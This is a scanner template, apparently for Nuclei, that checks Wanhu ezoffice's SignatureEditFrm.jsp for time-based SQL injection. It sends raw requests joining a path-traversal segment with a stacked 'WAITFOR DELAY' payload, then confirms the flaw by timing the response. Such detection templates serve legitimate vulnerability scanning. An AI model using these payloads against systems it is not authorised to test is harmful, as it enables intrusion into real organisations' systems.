id: poc-yaml-ezoffice-signatureeditfrm-sqli

info:
  name: 万户协同办公平台ezoffice SignatureEditFrm.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,9)}}"
  t2: "{{to_number(t1)+2}}"
  t3: "{{rand_int(1,4)}}"
  t4: "{{to_number(t3)+2}}"

http:
  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
      - type: word
        words:
          - "印签管理"
          - "请输入印签名"
        part: body

  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:{{t3}}%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t3)"
          - "duration <= to_number(t4)"
      - type: word
        words:
          - "印签管理"
          - "请输入印签名"
        part: body
